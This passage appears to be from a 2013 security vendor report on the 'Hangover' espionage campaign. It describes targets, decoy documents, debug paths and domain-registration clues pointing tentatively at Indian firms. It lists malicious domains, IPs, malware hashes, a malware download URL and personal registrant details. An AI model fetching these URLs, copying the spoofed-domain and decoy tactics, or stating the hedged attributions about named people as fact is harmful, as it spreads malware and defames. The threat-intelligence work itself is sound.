MBESCVDFRT, MBVDFRESCT TCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFile Boundary parameters vary between versions. The following have been seen in connection with this family: F39D45E70395ABFB8D8D2BFFC8BBD152, 90B452BFFF3F395ABDC878D8BEDBD152 FFF3F395A90B452BB8BEDC878DDBD152, 5A9DCB8FFF3F02B8B45BE39D152 5A902B8B45BEDCB8FFF3F39D152, 78DDB5A902BB8FFF3F398B45BEDCD152 2BB8FFF3F39878DDB5A90B45BEDCD152, 905ABEB452BFFFBDC878D83F39DBD152 D2BFFC8BBD152F3B8D89D45E70395ABF, 8765F3F395A90B452BB8BEDC878 90ABDC878D8BEDBB452BFFF3F395D152, F12BDC94490B452AA8AEDC878DCBD187 String content consists of some strings largely static between variants, and some that vary. Non-static strings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry keys, which also may be obfuscated by being fragmented. Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings. For example, the domain ¡°wearwellgarments.eu¡± is hidden as ¡°xfbsxfmmhbsnfout/fv¡± and the word ¡°php¡± becomes ¡°qiq¡±. Different variants are frequently given internal names, visible through debug paths included in the binary. Such internal names used include ¡°HangOver¡±, ¡°Ron¡±, ¡±Dragonball¡±, ¡±Tourist¡±, ¡±Klogger¡±, ¡°FirstBlood¡± and ¡°Babylon¡±. There are several other malwares and tools in use. See appendix C for more indicators. Target selection We have direct knowledge of only one attack . the one against Telenor. During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups. We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them; enough to identify targets down to IP and machine name/domain level. This showed a geographical distribution where Pakistan was the most affected in volume, but also showed a multitude of other countries being represented. Note that these data should be taken as indicative only. IP counts are misleading for many reasons. One machine can generate many IP addresses, and some IP addresses are probably lab machines. However, the indication that Pakistan is the most prevalent target seems solid. In the following pages we¡¯ve highlighted some of the files we have seen used to attack organizations in different countries. As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible. Pakistan The most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the most active in connecting to malicious domains. We found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012 log entry (subdomain redacted): Host Name:  PC-PS2CHAIRMAN  Registered Owner:     admin  Time Zone:  (GMT+05:00) Islamabad, Karachi  Domain:  ****.gov.pk  Sinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy: ¡°GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan.....¡± Decoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture and religious matters. Pakistani soldiers praying in Karakoram. Apparent source: http://photography.nationalgeographic.com/photography/enlarge/praying-soldiers_pod_image.html Google images of the Mendhar region in India. There was a border clash there recently. http://jammu.greaterkashmir.com/news/2013/Jan/12/mendhar-incident-creates-panic-among-border-residents-29.asp A review of Indian future weapon acquisitions.It seems to be sourced from defence.pk Additional examples can be found in Appendix B. China China is another country which apparently has been targeted to some extent. For example, we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution. This dump was generated in July 2012 and contains Word documents, PowerPoint presentations and images. Uploaded archives of harvested data. Decoys are also present, but not in the amount as is seen against Pakistani targets. Chinese decoy, a scanned document named court_order.jpg. This is a notification to the family of a criminal about his jail sentence. Language is simplified Chinese; likely mainland China. The Khalistan movement This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India. Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement¡¯s creation in 1971. Examples of malware apparently aimed at the movement are md5¡¯s a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa. The former appears to be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure . for example the domain researcherzone.net which was used in the Telenor intrusion. There are also a number of domains with active web pages that used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on to another bad IP (46.182.104.83) and must be considered owned by the attackers. The Nagaland movement The Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at least two attacks apparently aimed at them. A sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which appears to be a letter from the ¡°President of Nagalim¡±. The malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124. Zeusagency.org has hosted different malware; one (3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126. The IP range 176.31.65.124 -176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares. These are somewhat different from the standard Hanove series, though functionality is roughly equivalent. Another malicious installer (md5 f1799d11b34685aa209171b0a4b89d06) contained the following decoy: The malware included connects to the domain global-blog.net. Industrial espionage While the Telenor case was most likely industrial espionage, we were initially unaware of other ¡°non.strategic/political¡± targets by this attack group, but during our research we discovered several related attack files that were clearly targeting businesses. As can be seen in the example below, the social engineering aspects are more related to business content. We want to emphasize that except in the case of BUMI PLC, we have no information to suggest that any of the organizations named in the following pages have been compromised. However, the available information strongly indicates that they were targets of interests for the attackers. Likely target: Eurasian Natural Resources Corporation (ENRC) This company which is headquartered in London has operations in multiple countries, notably in Kazakhstan. The following malwares appear to be aimed at ENRC. ENRC__DEBT__INVESTORS__2012__for__your__Reference.exe (MD5 e40205cba4e84a47b7c7419ab6d77322) Deatils_for_the_ENRC_Board_Meeting_X1098977e79.exe (MD5 a5a740ce2f47eada46b5cae5facfe848) Details_for_the_ENRC_Board_Meeting_X10FR333_2012.exe (MD5 2895a9b0cf22cd45421d634dc0f68db1) Detail_description_of_ferro_chrome_silicon_and_ferro_chrome.exe (MD5 2102a18dc20dc6654c03e0e74f36033f) Gerhard_Ammann_Article_Content_From_Wikipedia.exe (MD5 d96aa87c25c9c491bee97aad65bafc9e) Gerhard Ammann is also affiliated with ENRC. Known target: Bumi PLC, Indonesia When searching for known instances of domains belonging to the attack infrastructure, we found a published incident report made by Context Information Security (2). This report details how the Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is an international mining group listed on the London Stock Exchange. Source: Context Information Security. Both the domains mentioned in this report have been connected to the attack group investigated. For example, the malware executable ¡°dua2alhycox12.exe¡± (c94267ba9c92f241379cdceed58777dc) connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The latter domain has also shared IP with the malicious domain chronicleserv.org. Likely target: Porsche Informatik A malware using the name ¡°webmailapp.exe¡± (22a3a1d5a89866a81152cd2fc98cd6e2) is a self-extracting archive containing several files, among them a batch file opening a shortened URL pointing to Porsche Holding¡¯s webmail front in Austria. Target must be assumed to be persons affiliated with Porsche. Again, we have no information as to whether any intrusion has occurred. The webmail front of Porsche in Austria. Possible target: Restaurant industry It appears unlikely that the restaurant and food industry should be the victim of targeted attacks. However, that¡¯s how it appears. One indicator is the decoy file below, taken from the malicious executable ¡°Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe¡° (f52154ae1366ae889d0783730040ea85). Guardian article about a horsemeat scandal in Ireland. Target is unknown, but file was first submitted to the VirusTotal scan service from Great Britain. Another indicator is the use of certain domain names, like the malicious bluebird.restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk. The latter is a restaurant in Chelsea, UK. Likely target: Chicago Mercantile Exchange While investigating the malicious domain web-mail-services.info, we found a number of other domains that had shared the IP address 188.95.48.99 with it.  One of these domains was cmegroups.net, a spoof of cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest futures exchange company (3). An entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was not disputed, and domain transferred to CME. However, the most interesting information is found in the case details. Source:wipo.net An interesting question is of course whether there were any attachments to this mail. Other suggestive domain names that have been used include: server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de: The latter is the mail server for several German businesses, for example restaurants. www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com: The latter is a Lebanese newspaper in Arabic. account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de: The latter is a German producer of pumps for high-viscosity fluids. deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com: Delta Airlines. mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no: Telenor lynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm. mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us: The latter is the webmail address of Carmel&Carmel, a US-based law firm. armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com: The latter is a US-based manufacturer of composite materials for armor: We do not know (yet) what purpose all these domains have, but it¡¯s hard to imagine that the name spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks. Attribution The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian origin. Project and debug paths Curiously, many of the executables we uncovered from related cases contained cleartext project and debug path strings (see Appendix C for full list). It is not very common to find malware with debug paths, but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were unaware of their presence. These paths gave more indicators that the attackers were Indian. First, many of the Visual Basic keyloggers contained the name ¡°Yash¡±, which might be an abbreviation for several Indian names. The trojans used against Telenor did not contain any such person name, but the Visual Basic project name is clearly related to others: Telenor case (02d6519b0330a34b72290845e7ed16ab, bfd2529e09932ac6ca18c3aaff55bd79) ¡°C:\miNaPro.vbp¡± Related cases (4ad80ff251e92004f56bb1b531175a49, 3d6a8b2df08443c2aa4b6a07a9b55b16) ¡°D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack(sep2012)\miNaPro.vbp¡± This similarity is not coincidental; these trojans are based on the same code and exhibit similar behaviour. This and other text strings we initially saw gave further hints towards Indian attackers. R:\payloads\ita nagar\Uploader\HangOver 1.5.7 (Startup)\HangOver 1.5.7 (Startup)\Release\Http_t.pdb C:\Users\neeru rana\Desktop\Klogger-30 may\Klogger-30 may\Release\Klogger.pdb C:\Users\Yash\Desktop\New folder\HangOver 1.5.7 (Startup) uploader\Release\Http_t.pdb A managed environment The project paths also give a rare glimpse into something we almost never see . a managed malware creation environment, where multiple developers are tasked with specific malware deliverances. This is visible in the way the projects themselves are organized: ...Desktop\Feb 2012\kmail(httpform1.1) ... ...May Payload\new keylogger\Flashdance1.0.2\... ...\Monthly Task\August 2011\USB Prop\... ...\Sept 2012\Keylogger\Release\... ...\June mac paylods\final Klogger-1 june-Fud from eset5.0\Klogger-30 may\... ...ner\Task\HangOver 1.2.2\Release... ...\august\13 aug\HangOver 1.5.7 (Startup) uploader\... ...\task information\task of september\Tourist 2.4.3... ...\final project backup\complete task of ad downloader & usb grabber&uploader\... ..D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\.. There are many diverging project paths which points towards different persons working on separate subprojects, but apparently not using a centralized source control system. The projects seem to be delegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures, like the string ¡°VB Team Matrix Production¡± found in a sample (fa6d2483f766f8431b6c0a8c78178d48), an indication that a separate team works with Visual Basic development. Some series of malware contain strings like ¡°delivered¡±, which, together with the loose project structures may indicate that development work is being outsourced. The word ¡°Appin¡±. In a great number of isolated cases and contexts, the word ¡°Appin¡± shows up and there seems to be some connection with the Indian security company called Appin Security Group. By this, we are not implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved, or maybe there are other explanations. Getting to the bottom of that is beyond our visibility. For example, the strings ¡°Appin¡±, ¡°AppinSecurityGroup¡±, and ¡°Matrix¡± are frequently found inside executables. One example of this peculiarity is debug paths inside malware files: C:\BNaga\backup_28_09_2010\threads tut\pen-backup\BB_FUD_23\Copy of client\ Copy of client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb C:\BNaga\kaam\Appin SOFWARES\RON 2.0.0\Release\Ron.pdb C:\BNaga\SCode\BOT\MATRIX_1.2.2.0\appinbot_1.2_120308\Build\Win32\Release\deleter.pdb C:\Documents and Settings\Administrator\Desktop\Backup\17_8_2011\MATRIX_1.3.4\CLIENT\ Build\Win32\Release\appinclient.pdb D:\Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdb One should note that anyone can add or change such text strings. Domain registrations As mentioned, the privacy-protection of domain registrations is almost perfect, but only almost. There are a large number of domains used, and a few of these have been suspended and lost their privacy protection. For example, the following malicious domains all used the same registration information NITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM: Registrant:NA Prakash (mail@gmail.com)Jain TY-76, Kohat Enclave Delhi Delhi,110034 IN Tel. +011.9873456756 Identical registration information is also used for other domains that seem unrelated to the attack infrastructure, like hackerscouncil.com which May 12th 2011 had the following entry (source: gwebtools.com). April 3th 2011, a little over a month before the registration entry above, hackerscouncil.com was registered by Appin Technologies (5). This is possibly a coincidence. HACKERSCOUNCIL.COM Registrant: Appin TechnologiesRakesh Gupta  (rakesh.gupta@appinonline.com) 9th Floor, Metro Heights,NSP, PitamPura,Delhi Delhi,110034 IN Tel. +91.1147063300 Creation Date: 17-Sep-2009  Expiration Date: 17-Sep-2011 The domain piegauz.net, which was used as a Command and Control domain for several trojan configurations was created April 21st 2010 and had the following initial registration information: PIEGAUZ.NET Registrant:PrivacyProtect.org Domain Admin  (contact@privacyprotect.org) P.O. Box 97 Note -All Postal Mails Rejected, visit Privacyprotect.orgMoergestel null,5066 ZH NL Tel. +45.36946676 One trojan using this domain (md5 4a44b6b6463fa1a8e0515669b10bd338) was submitted to the ThreatExpert analysis service October 28th 2010, at which time the domain was operational and accepted uploads from the malware (6). Three days later, October 31st 2010, the domain got suspended, which removed its privacy protection: PIEGAUZ.NET Registrant: Appin TechnologiesRakesh Gupta  (rakesh.gupta@appinonline.com) 9th Floor, Metro Heights,NSP, PitamPura,Delhi Delhi,110034 IN Tel. +91.1147063300 Creation Date: 21-Apr-2010  Expiration Date: 21-Apr-2011 The domain bluecreams.com was initially registered by Appin Security Solutions Pvt. Ltd. Sept 17th 2009. The day after it was put under privacy protection. In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans (5). It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant. Another example is the domain zerodayexploits.org. This domain has a history of resolving to a series of malicious IP addresses used for malware attacks (173.236.24.254, 8.22.200.44). This web site which offers bounties for zeroday exploits, claims to be founded by ¡°Appin Morpheus¡± and powered by Appin. Source: bgwhois.com Also the live behaviour of some domains shows the word Appin. The malicious domains alr3ady.net, wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and maxtourguide.info inhabit the IP space 178.32.75.192 -178.32.75.197. All these IP¡¯s return a recognizable ESMTP banner: $ telnet 178.32.75.193 587 Trying 178.32.75.193... Connected to 178.32.75.193. Escape character is '^]'. 220 transformer13_appin ESMTP Exim 4.80.1 Sat, 23 Mar 2013 20:36:34 +0300 Other interesting indicators were found when we examined the domain softservices.org; a domain which has held several of the known malicious IP addresses used by this group (46.182.104.83, 94.185.81.153, 89.207.135.242). However, even if the domain was obviously connected, we could find no malware that used it. Instead, we found this forum post on the Nokia developer forum: Developer username redacted. The interesting bit was found further down this thread, where the developer posted a snippet of source code: This piece of code appears used for uploading mobile data like IMEI number to softservices.org. We then found the apparent developer¡¯s profile on Elance, an online employment service for freelance programmers. The developer¡¯s CV on Elance (name redacted). Based on this we suspect that there are or have been projects to develop mobile malware by this group, even if we have not found any related mobile malware in our databases.  Mantra Tech Ventures and INNEFU Mantra Tech Ventures is the registration service for several of the malicious domains that have been in use. The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com, mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net, webmicrosoftupdate.net and fuzzyfile.net. Abhedya is also visible in the PIEGAUZ.NET name server history: Event Date Action Pre-Action Server  Post-Action Server ============================================================================= 2010-04-22      New -none-Abhedya.net2010-04-23  Transfer Abhedya.net Piegauz.net 2010-11-01  Delete Piegauz.net -none.2010-11-04  New -none-Suspended-domain.com 2010-11-11  Transfer Suspended-domain.com  Piegauz.net2012-04-23  Transfer Piegauz.net Foundationapi.com2012-06-02  Delete Foundationapi.com -none.2012-07-09  New -none-Above.com abedhya.net is currently a privacy protected domain, but it used to be registered by one Arun Bansal, CEO and founder of Mantra Ventures and the ¡°Ethical Hacking Institute¡± hackingtruths.org. Domain Name: ABHEDYA.NET Registrant:HackingTruths Arun Bansal (arun@hackingtruths.org)464, Neelkanth Apts., Sec.-13 Rohini Delhi,110085 IN The domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures company. There is another interesting detail: We found a connection log on one of the open drop folders earlier mentioned. This log folder was named ¡°test¡± and data in it was uploaded from an IP belonging to the French provider OVH. The log contained data from a lab test PC whose registered owner was ¡°innefu¡±. There is indeed an Indian information security consulting group named Innefu. The domain innefu.com was registered by the same Arun Bansal. Innefu also hires ¡°ethical hackers¡±: It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research. Conclusion When researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business, government and political organizations around the world for over three years. There are also indicators of involvement by private sector companies or persons connected to these, though these data are circumstantial and may be attempts to implicate said companies. We have no visibility into whether the attacks were done on behalf of others, and if so who commissioned them or whether all attacks were commissioned by one entity or by several. The methods used were primarily based on different social engineering tactics rather than exploits, but history has shown that social engineering based attacks can be very successful, confirmed once again by looking at the data we have been able to uncover. Organizations today need to realize that it¡¯s not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises. Bibliography 1. Scumware.org. Scumware search. scumware.org. [Online] http://www.scumware.org/report/173.236.24.254. 2. MacKenzie, Stuart. [Online] http://www.thetimes.co.uk/tto/multimedia/archive/00372/DOC100113.100120132_372895a.pdf. 3. Wikipedia. CME Group. Wikipedia. [Online] http://en.wikipedia.org/wiki/CME_Group. 4. WIPO. WIPO Arbitration and Mediation Center. WIPO. [Online] http://www.oapi.wipo.net/amc/en/domains/search/text.jsp?case=D2012-1666. 5. Scumware.org. Scumware search. Scumware.org. [Online] http://www.scumware.org/report/bluecreams.com. 6. Viruswatch. Virus-sites with status changes. Clean-MX.com. [Online] http://lists.clean.mx.com/pipermail/viruswatch/20110317/023586.html. Passive DNS data provided by ISC Security (https://security.isc.org/) Appendixes (available in a separate document) A. Samples extracted from Telenor intrusion B. Some related cases based on behaviour and malware similarity parameters. C. Malware string indicators D. Project and debug paths extracted from executables E. Domain names connected to case F. IP addresses connected to case G. Sample MD5¡¯s lo l lea er a ioneer in pro ivFounded in Norway, Norman AS is a global leader and pioneer in proactive of wa olutions nd or ns lwa ools owsecurity software solutions and forensics malware tools. Powered by pa enedNo ma dB x tpatented Norman SandBox technology, Norman AS offers Enterprise customers solutions for building defensible networks against advanced attacks an was ta lishe in 1 nd is ad uartargeted attacks. Norman was established in 1984 and is headquartered in Norway with continental Europe, UK an d US as its main markets Contact Us: Norman Shark 1855 1st Avenue, Suite 201 San Diego, CA 92101 USA 1 888 GO NORMAN http://enterprise.norman.com 